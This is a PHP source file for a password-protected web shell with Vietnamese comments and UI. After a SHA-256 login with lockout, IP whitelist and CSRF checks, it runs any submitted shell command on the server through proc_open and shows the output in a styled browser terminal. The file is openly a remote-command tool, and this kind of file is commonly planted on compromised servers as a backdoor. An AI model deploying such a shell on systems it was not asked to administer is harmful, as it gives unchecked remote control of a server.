<?php

// --- Debug (tắt khi deploy production) ---
error_reporting(E_ALL);
ini_set('display_errors', 0);

/**
 * WebShell - Secure Remote Command Execution
 * Password authentication via SHA256 (config/password.php)
 */

// Load cấu hình
$config_file = __DIR__ . '/config/password.php';
if (!file_exists($config_file)) {
    die('<h2 style="color:red;font-family:monospace">⚠ Lỗi: Không tìm thấy file config/password.php</h2>');
}
require_once $config_file;

// --- HTTP Security Headers ---
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: no-referrer');
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://fonts.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; font-src https://fonts.gstatic.com; connect-src 'self'; img-src 'self' data:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'");
// Bật HSTS nếu dùng HTTPS (bỏ comment dòng dưới nếu đã có SSL)
// header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');

// --- Bảo mật Session ---
ini_set('session.use_strict_mode', 1);
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_samesite', 'Strict');
// Bật cookie_secure khi dùng HTTPS
// ini_set('session.cookie_secure', 1);
session_name(SESSION_NAME);
session_start();

// --- Kiểm tra IP Whitelist ---
function check_ip_whitelist()
{
    if (empty(IP_WHITELIST)) return true;
    $client_ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    return in_array($client_ip, IP_WHITELIST, true);
}

// --- Quản lý đăng nhập thất bại ---
function get_attempts_data()
{
    $file = sys_get_temp_dir() . '/wsh_attempts_' . md5(__FILE__) . '.json';
    if (!file_exists($file)) return ['count' => 0, 'last_attempt' => 0, 'locked_until' => 0];
    $data = json_decode(file_get_contents($file), true);
    return $data ?? ['count' => 0, 'last_attempt' => 0, 'locked_until' => 0];
}

function save_attempts_data($data)
{
    $file = sys_get_temp_dir() . '/wsh_attempts_' . md5(__FILE__) . '.json';
    file_put_contents($file, json_encode($data));
}

function reset_attempts()
{
    $file = sys_get_temp_dir() . '/wsh_attempts_' . md5(__FILE__) . '.json';
    if (file_exists($file)) unlink($file);
}

// Kiểm tra IP
if (!check_ip_whitelist()) {
    http_response_code(403);
    die('403 Forbidden');
}

// --- Xử lý đăng nhập ---
$error_msg = '';
$login_locked = false;
$lock_remaining = 0;

$attempts = get_attempts_data();
$now = time();

if ($attempts['locked_until'] > $now) {
    $login_locked = true;
    $lock_remaining = $attempts['locked_until'] - $now;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {

    // Đăng xuất
    if ($_POST['action'] === 'logout') {
        $_SESSION = [];
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }

    // Đăng nhập
    if ($_POST['action'] === 'login' && !$login_locked) {
        $password = $_POST['password'] ?? '';
        $hashed = hash('sha256', $password);
        if (hash_equals(SHELL_PASSWORD_HASH, $hashed)) {
            reset_attempts();
            $_SESSION['authenticated'] = true;
            $_SESSION['login_time'] = $now;
            $_SESSION['last_activity'] = $now;
            $_SESSION['token'] = bin2hex(random_bytes(16));
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $attempts['count']++;
            $attempts['last_attempt'] = $now;
            if ($attempts['count'] >= MAX_FAILED_ATTEMPTS) {
                $attempts['locked_until'] = $now + LOCKOUT_TIME;
                $login_locked = true;
                $lock_remaining = LOCKOUT_TIME;
                $error_msg = 'Quá nhiều lần thử sai. Tài khoản bị khóa ' . LOCKOUT_TIME . ' giây.';
            } else {
                $remaining = MAX_FAILED_ATTEMPTS - $attempts['count'];
                $error_msg = 'Mật khẩu không đúng. Còn ' . $remaining . ' lần thử.';
            }
            save_attempts_data($attempts);
        }
    }
}

// --- Kiểm tra phiên ---
$authenticated = false;
if (!empty($_SESSION['authenticated'])) {
    if (($now - ($_SESSION['last_activity'] ?? 0)) > SESSION_TIMEOUT) {
        $_SESSION = [];
        session_destroy();
        $error_msg = 'Phiên đã hết hạn. Vui lòng đăng nhập lại.';
    } else {
        $_SESSION['last_activity'] = $now;
        $authenticated = true;
    }
}

// --- Thực thi lệnh (AJAX) ---
if ($authenticated && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'exec') {
    header('Content-Type: application/json');
    // CSRF check
    if (!hash_equals($_SESSION['token'] ?? '', $_POST['token'] ?? '')) {
        echo json_encode(['error' => 'Invalid CSRF token']);
        exit;
    }
    $cmd = $_POST['cmd'] ?? '';
    if (empty(trim($cmd))) {
        echo json_encode(['output' => '', 'cwd' => getcwd()]);
        exit;
    }
    // Khôi phục thư mục làm việc trước khi xử lý lệnh và cd
    if (!empty($_SESSION['cwd']) && is_dir($_SESSION['cwd'])) {
        chdir($_SESSION['cwd']);
    }
    // Xử lý lệnh cd
    if (preg_match('/^\s*cd\s+(.*)/i', $cmd, $matches)) {
        $dir = trim($matches[1]);
        if (empty($dir) || $dir === '~') {
            $dir = PHP_OS_FAMILY === 'Windows' ? (getenv('USERPROFILE') ?: 'C:\\') : (getenv('HOME') ?: '/');
        }
        if (chdir($dir)) {
            $_SESSION['cwd'] = getcwd();
            echo json_encode(['output' => '', 'cwd' => getcwd()]);
        } else {
            echo json_encode(['output' => "cd: Không tìm thấy thư mục: $dir\r\n", 'cwd' => getcwd()]);
        }
        exit;
    }
    $cwd = getcwd();
    // Thực thi lệnh
    $output = '';
    if (function_exists('proc_open')) {
        $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $proc = proc_open($cmd, $descriptorspec, $pipes, $cwd);
        if (is_resource($proc)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($proc);
            if (!empty($stderr) && empty(trim($output))) {
                $output = $stderr;
            } elseif (!empty($stderr)) {
                $output .= $stderr;
            }
        }
    } else {
        $output = "[Lỗi] Không thể thực thi lệnh: proc_open đã bị vô hiệu hóa.";
    }
    echo json_encode(['output' => $output ?? '', 'cwd' => getcwd()]);
    exit;
}

// --- Thông tin hệ thống ---
$sys_info = [];
if ($authenticated) {
    $sys_info = [
        'os'   => PHP_OS_FAMILY . ' (' . php_uname('m') . ')',
        'php'  => PHP_VERSION,
        'user' => function_exists('get_current_user') ? get_current_user() : 'unknown',
        'cwd'  => getcwd(),
        'ip'   => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'time' => date('Y-m-d H:i:s'),
    ];
    if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd();
}
$token = $authenticated ? ($_SESSION['token'] ?? '') : '';
?>
<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebShell :: Remote Terminal</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0a0c10;
            --bg-panel: #0d1117;
            --bg-card: #161b22;
            --bg-input: #1c2128;
            --border: #30363d;
            --border-glow: #00ff9d22;
            --green: #00ff9d;
            --green-dim: #00cc7a;
            --green-dark: #003d25;
            --red: #ff4757;
            --yellow: #ffd32a;
            --blue: #4fc3f7;
            --text-main: #e6edf3;
            --text-dim: #7d8590;
            --text-muted: #484f58;
            --shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
        }

        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html,
        body {
            height: 100%;
            overflow: hidden;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg-dark);
            color: var(--text-main);
            display: flex;
            flex-direction: column;
            height: 100vh;
        }

        /* ---- Scanline overlay ---- */
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 157, 0.015) 2px, rgba(0, 255, 157, 0.015) 4px);
            pointer-events: none;
            z-index: 9999;
        }

        /* ============ LOGIN PAGE ============ */
        .login-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background: radial-gradient(ellipse at 50% 40%, #00ff9d08 0%, transparent 70%), var(--bg-dark);
        }

        .login-box {
            width: 420px;
            background: var(--bg-panel);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 40px;
            box-shadow: var(--shadow), 0 0 60px rgba(0, 255, 157, 0.06);
            animation: fadeSlideIn 0.4s ease;
        }

        @keyframes fadeSlideIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .login-logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .login-logo .icon {
            font-size: 3rem;
            margin-bottom: 8px;
            filter: drop-shadow(0 0 16px var(--green));
        }

        .login-logo h1 {
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.4rem;
            font-weight: 700;
            color: var(--green);
            letter-spacing: 2px;
        }

        .login-logo p {
            color: var(--text-dim);
            font-size: 0.8rem;
            margin-top: 6px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 0.78rem;
            font-weight: 500;
            color: var(--text-dim);
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .form-group input {
            width: 100%;
            padding: 12px 16px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text-main);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.95rem;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .form-group input:focus {
            border-color: var(--green);
            box-shadow: 0 0 0 3px rgba(0, 255, 157, 0.1);
        }

        .login-btn {
            width: 100%;
            padding: 13px;
            background: linear-gradient(135deg, var(--green), var(--green-dim));
            border: none;
            border-radius: 8px;
            color: #000;
            font-weight: 700;
            font-size: 0.95rem;
            letter-spacing: 1px;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'JetBrains Mono', monospace;
        }

        .login-btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 20px rgba(0, 255, 157, 0.35);
        }

        .login-btn:active {
            transform: translateY(0);
        }

        .login-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .error-msg {
            background: rgba(255, 71, 87, 0.12);
            border: 1px solid rgba(255, 71, 87, 0.3);
            border-radius: 8px;
            padding: 12px 16px;
            color: var(--red);
            font-size: 0.85rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .sha-note {
            margin-top: 20px;
            padding: 12px;
            background: var(--bg-input);
            border-radius: 8px;
            font-size: 0.75rem;
            color: var(--text-muted);
            font-family: 'JetBrains Mono', monospace;
            text-align: center;
        }

        .sha-note span {
            color: var(--text-dim);
        }

        /* ============ SHELL PAGE ============ */
        .shell-header {
            background: var(--bg-panel);
            border-bottom: 1px solid var(--border);
            padding: 10px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-shrink: 0;
        }

        .shell-header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .traffic-lights {
            display: flex;
            gap: 6px;
        }

        .traffic-lights span {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }

        .tl-red {
            background: #ff5f57;
        }

        .tl-yellow {
            background: #febc2e;
        }

        .tl-green {
            background: #28c840;
        }

        .shell-title {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            color: var(--text-dim);
        }

        .shell-title strong {
            color: var(--green);
        }

        .header-actions {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .badge {
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 0.72rem;
            font-weight: 600;
            font-family: 'JetBrains Mono', monospace;
            letter-spacing: 0.5px;
        }

        .badge-green {
            background: var(--green-dark);
            color: var(--green);
            border: 1px solid rgba(0, 255, 157, 0.2);
        }

        .badge-blue {
            background: rgba(79, 195, 247, 0.1);
            color: var(--blue);
            border: 1px solid rgba(79, 195, 247, 0.2);
        }

        .logout-btn {
            padding: 6px 14px;
            border-radius: 6px;
            background: transparent;
            border: 1px solid var(--border);
            color: var(--text-dim);
            font-size: 0.8rem;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'Inter', sans-serif;
        }

        .logout-btn:hover {
            border-color: var(--red);
            color: var(--red);
        }

        .shell-body {
            display: flex;
            flex: 1;
            overflow: hidden;
        }

        /* ---- Sidebar info ---- */
        .sidebar {
            width: 220px;
            flex-shrink: 0;
            background: var(--bg-panel);
            border-right: 1px solid var(--border);
            padding: 16px;
            overflow-y: auto;
        }

        .sidebar-section {
            margin-bottom: 20px;
        }

        .sidebar-title {
            font-size: 0.68rem;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            color: var(--text-muted);
            margin-bottom: 10px;
            font-weight: 600;
        }

        .info-row {
            display: flex;
            flex-direction: column;
            margin-bottom: 10px;
        }

        .info-label {
            font-size: 0.68rem;
            color: var(--text-muted);
            margin-bottom: 2px;
        }

        .info-value {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.73rem;
            color: var(--text-main);
            word-break: break-all;
        }

        .info-value.green {
            color: var(--green);
        }

        .online-dot {
            display: inline-block;
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: var(--green);
            margin-right: 5px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {

            0%,
            100% {
                opacity: 1;
                box-shadow: 0 0 0 0 rgba(0, 255, 157, 0.4);
            }

            50% {
                opacity: 0.8;
                box-shadow: 0 0 0 5px rgba(0, 255, 157, 0);
            }
        }

        #current-path {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.7rem;
            color: var(--yellow);
            word-break: break-all;
        }

        /* ---- Terminal area ---- */
        .terminal-wrap {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        #terminal-output {
            flex: 1;
            overflow-y: auto;
            padding: 16px 20px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.82rem;
            line-height: 1.7;
            background: var(--bg-dark);
            white-space: pre-wrap;
            word-break: break-all;
            color: #c9d1d9;
        }

        #terminal-output::-webkit-scrollbar {
            width: 6px;
        }

        #terminal-output::-webkit-scrollbar-track {
            background: transparent;
        }

        #terminal-output::-webkit-scrollbar-thumb {
            background: var(--border);
            border-radius: 3px;
        }

        .term-welcome {
            margin-bottom: 12px;
            color: var(--green);
            border-bottom: 1px solid var(--border);
            padding-bottom: 12px;
        }

        .term-line {
            display: flex;
            flex-direction: column;
            margin-bottom: 4px;
        }

        .term-prompt {
            color: var(--green);
            font-weight: 600;
        }

        .term-cmd {
            color: var(--yellow);
        }

        .term-out {
            color: #c9d1d9;
            white-space: pre-wrap;
        }

        .term-error {
            color: var(--red);
        }

        .spinner {
            display: inline-block;
            width: 10px;
            height: 10px;
            border: 2px solid var(--text-muted);
            border-top-color: var(--green);
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin-right: 6px;
            vertical-align: middle;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* ---- Input row ---- */
        .input-row {
            display: flex;
            align-items: center;
            padding: 12px 20px;
            background: var(--bg-panel);
            border-top: 1px solid var(--border);
            gap: 10px;
            flex-shrink: 0;
        }

        .input-prompt {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            color: var(--green);
            white-space: nowrap;
            font-weight: 600;
            flex-shrink: 0;
        }

        #cmd-input {
            flex: 1;
            background: transparent;
            border: none;
            outline: none;
            color: var(--yellow);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            caret-color: var(--green);
        }

        #cmd-input::placeholder {
            color: var(--text-muted);
        }

        .run-btn {
            padding: 8px 18px;
            border-radius: 6px;
            background: var(--green-dark);
            border: 1px solid rgba(0, 255, 157, 0.25);
            color: var(--green);
            font-size: 0.8rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'JetBrains Mono', monospace;
            flex-shrink: 0;
        }

        .run-btn:hover {
            background: rgba(0, 255, 157, 0.15);
            box-shadow: 0 0 12px rgba(0, 255, 157, 0.2);
        }

        .run-btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        .clear-btn {
            padding: 8px 12px;
            border-radius: 6px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            color: var(--text-dim);
            font-size: 0.8rem;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'JetBrains Mono', monospace;
            flex-shrink: 0;
        }

        .clear-btn:hover {
            border-color: var(--text-dim);
            color: var(--text-main);
        }
    </style>
</head>

<body>
    <?php if (!$authenticated): ?>
        <!-- ==================== LOGIN PAGE ==================== -->
        <div class="login-wrapper">
            <div class="login-box">
                <div class="login-logo">
                    <div class="icon">🖥️</div>
                    <h1>WEBSHELL</h1>
                    <p>Secure Remote Terminal Access</p>
                </div>
                <?php if ($error_msg): ?>
                    <div class="error-msg">⚠️ <?= htmlspecialchars($error_msg) ?></div>
                <?php endif; ?>
                <form method="POST" autocomplete="off">
                    <input type="hidden" name="action" value="login">
                    <div class="form-group">
                        <label>Mật khẩu truy cập</label>
                        <input type="password" name="password" id="password"
                            placeholder="Nhập mật khẩu..."
                            autofocus <?= $login_locked ? 'disabled' : '' ?>>
                    </div>
                    <button type="submit" class="login-btn" <?= $login_locked ? 'disabled' : '' ?>>
                        <?php if ($login_locked): ?>
                            🔒 Bị khóa <?= $lock_remaining ?>s
                        <?php else: ?>
                            → ĐĂNG NHẬP
                        <?php endif; ?>
                    </button>
                </form>
                <div class="sha-note">
                    Bảo mật: <span>SHA-256</span> · Phiên: <span><?= SESSION_TIMEOUT / 60 ?> phút</span>
                </div>
            </div>
        </div>

        <?php if ($login_locked): ?>
            <script>
                (function() {
                    var remaining = <?= $lock_remaining ?>;
                    var btn = document.querySelector('.login-btn');
                    var iv = setInterval(function() {
                        remaining--;
                        if (remaining <= 0) {
                            clearInterval(iv);
                            location.reload();
                            return;
                        }
                        btn.textContent = '🔒 Bị khóa ' + remaining + 's';
                    }, 1000);
                })();
            </script>
        <?php endif; ?>

    <?php else: ?>
        <!-- ==================== SHELL PAGE ==================== -->
        <div class="shell-header">
            <div class="shell-header-left">
                <div class="traffic-lights">
                    <span class="tl-red"></span>
                    <span class="tl-yellow"></span>
                    <span class="tl-green"></span>
                </div>
                <div class="shell-title">
                    <strong>WebShell</strong> :: <?= htmlspecialchars($sys_info['os']) ?>
                </div>
            </div>
            <div class="header-actions">
                <span class="badge badge-green"><span class="online-dot"></span>LIVE</span>
                <span class="badge badge-blue">PHP <?= PHP_MAJOR_VERSION ?>.<?= PHP_MINOR_VERSION ?>.*</span>
                <form method="POST" style="display:inline">
                    <input type="hidden" name="action" value="logout">
                    <button type="submit" class="logout-btn">⏻ Đăng xuất</button>
                </form>
            </div>
        </div>

        <div class="shell-body">
            <!-- Sidebar -->
            <aside class="sidebar">
                <div class="sidebar-section">
                    <div class="sidebar-title">Hệ thống</div>
                    <div class="info-row">
                        <span class="info-label">OS</span>
                        <span class="info-value"><?= htmlspecialchars($sys_info['os']) ?></span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">PHP</span>
                        <span class="info-value green"><?= PHP_VERSION ?></span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">User</span>
                        <span class="info-value"><?= htmlspecialchars($sys_info['user']) ?></span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Your IP</span>
                        <span class="info-value"><?= htmlspecialchars($sys_info['ip']) ?></span>
                    </div>
                </div>
                <div class="sidebar-section">
                    <div class="sidebar-title">Thư mục hiện tại</div>
                    <div id="current-path"><?= htmlspecialchars(getcwd()) ?></div>
                </div>
                <div class="sidebar-section">
                    <div class="sidebar-title">Phím tắt</div>
                    <div class="info-row">
                        <span class="info-label" style="color:var(--yellow)">↑↓</span>
                        <span class="info-value" style="font-size:0.68rem">Lịch sử lệnh</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label" style="color:var(--yellow)">Enter</span>
                        <span class="info-value" style="font-size:0.68rem">Thực thi</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label" style="color:var(--yellow)">Ctrl+L</span>
                        <span class="info-value" style="font-size:0.68rem">Xóa màn hình</span>
                    </div>
                </div>
            </aside>

            <!-- Terminal -->
            <div class="terminal-wrap">
                <div id="terminal-output">
                    <div class="term-welcome"> __ __ _ ____ _ _ _
                        \ \ / /__| |__ / ___|| |__ ___| | |
                        \ \ /\ / / _ \ '_ \\___ \| '_ \ / _ \ | |
                        \ V V / __/ |_) |___) | | | | __/ | |
                        \_/\_/ \___|_.__/|____/|_| |_|\___|_|_|

                        Secure Remote Terminal | <?= htmlspecialchars($sys_info['os']) ?>

                        Người dùng : <?= htmlspecialchars($sys_info['user']) ?>
                        Thời gian : <?= $sys_info['time'] ?>
                        PHP : <?= PHP_VERSION ?>

                        Gõ lệnh bên dưới và nhấn Enter hoặc click [RUN]
                    </div>
                </div>
                <div class="input-row">
                    <span class="input-prompt" id="prompt-text">$ &nbsp;</span>
                    <input type="text" id="cmd-input" placeholder="Gõ lệnh shell..." autofocus spellcheck="false" autocomplete="off">
                    <button class="clear-btn" onclick="clearTerminal()" title="Xóa màn hình">CLR</button>
                    <button class="run-btn" id="run-btn" onclick="runCommand()">▶ RUN</button>
                </div>
            </div>
        </div>

        <script>
            const CSRF_TOKEN = <?= json_encode($token) ?>;
            let history_cmds = [];
            let history_idx = -1;
            let is_running = false;
            let current_cwd = <?= json_encode(getcwd()) ?>;

            const outputEl = document.getElementById('terminal-output');
            const inputEl = document.getElementById('cmd-input');
            const runBtn = document.getElementById('run-btn');
            const pathEl = document.getElementById('current-path');
            const promptEl = document.getElementById('prompt-text');

            function updatePrompt(cwd) {
                current_cwd = cwd;
                pathEl.textContent = cwd;
                // Lấy tên thư mục cuối
                const parts = cwd.replace(/\\/g, '/').split('/').filter(Boolean);
                const short = parts[parts.length - 1] || cwd;
                promptEl.textContent = short + ' $ ';
            }

            function clearTerminal() {
                // Giữ lại welcome, xóa các dòng sau
                const lines = outputEl.querySelectorAll('.term-line');
                lines.forEach(l => l.remove());
            }

            function appendLine(promptText, cmd, output, isError) {
                const line = document.createElement('div');
                line.className = 'term-line';
                let html = '';
                if (cmd !== null) {
                    html += `<span class="term-prompt">${escHtml(promptText)}</span> <span class="term-cmd">${escHtml(cmd)}</span>`;
                }
                if (output) {
                    const cls = isError ? 'term-error' : 'term-out';
                    html += `\n<span class="${cls}">${escHtml(output)}</span>`;
                }
                line.innerHTML = html;
                outputEl.appendChild(line);
                outputEl.scrollTop = outputEl.scrollHeight;
            }

            function appendSpinner(promptText, cmd) {
                const line = document.createElement('div');
                line.className = 'term-line';
                line.id = 'running-line';
                line.innerHTML = `<span class="term-prompt">${escHtml(promptText)}</span> <span class="term-cmd">${escHtml(cmd)}</span>\n<span class="term-out"><span class="spinner"></span>Đang thực thi...</span>`;
                outputEl.appendChild(line);
                outputEl.scrollTop = outputEl.scrollHeight;
                return line;
            }

            function escHtml(s) {
                if (s == null) return '';
                return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
            }

            function runCommand() {
                if (is_running) return;
                const cmd = inputEl.value.trim();
                if (!cmd) return;

                // Lịch sử
                if (history_cmds[history_cmds.length - 1] !== cmd) history_cmds.push(cmd);
                history_idx = history_cmds.length;
                inputEl.value = '';

                const promptSnap = promptEl.textContent;
                is_running = true;
                runBtn.disabled = true;
                inputEl.disabled = true;

                // Xử lý lệnh clear/cls
                if (cmd === 'clear' || cmd === 'cls') {
                    clearTerminal();
                    is_running = false;
                    runBtn.disabled = false;
                    inputEl.disabled = false;
                    inputEl.focus();
                    return;
                }
                if (cmd === 'exit' || cmd === 'logout') {
                    document.querySelector('form[method=POST]').submit();
                    return;
                }

                const spinner = appendSpinner(promptSnap, cmd);

                fetch(window.location.href, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        },
                        body: new URLSearchParams({
                            action: 'exec',
                            cmd: cmd,
                            token: CSRF_TOKEN
                        })
                    })
                    .then(r => r.json())
                    .then(data => {
                        spinner.remove();
                        if (data.error) {
                            appendLine(promptSnap, cmd, data.error, true);
                        } else {
                            appendLine(promptSnap, cmd, data.output, false);
                        }
                        if (data.cwd) updatePrompt(data.cwd);
                    })
                    .catch(err => {
                        spinner.remove();
                        appendLine(promptSnap, cmd, '[Lỗi kết nối] ' + err.message, true);
                    })
                    .finally(() => {
                        is_running = false;
                        runBtn.disabled = false;
                        inputEl.disabled = false;
                        inputEl.focus();
                    });
            }

            // Xử lý phím
            inputEl.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    runCommand();
                    return;
                }
                if (e.key === 'ArrowUp') {
                    e.preventDefault();
                    if (history_idx > 0) {
                        history_idx--;
                        inputEl.value = history_cmds[history_idx] || '';
                    }
                }
                if (e.key === 'ArrowDown') {
                    e.preventDefault();
                    if (history_idx < history_cmds.length - 1) {
                        history_idx++;
                        inputEl.value = history_cmds[history_idx] || '';
                    } else {
                        history_idx = history_cmds.length;
                        inputEl.value = '';
                    }
                }
                if (e.key === 'l' && e.ctrlKey) {
                    e.preventDefault();
                    clearTerminal();
                }
            });

            // Focus input khi click terminal
            outputEl.addEventListener('click', () => inputEl.focus());
            inputEl.focus();
        </script>
    <?php endif; ?>
</body>

</html>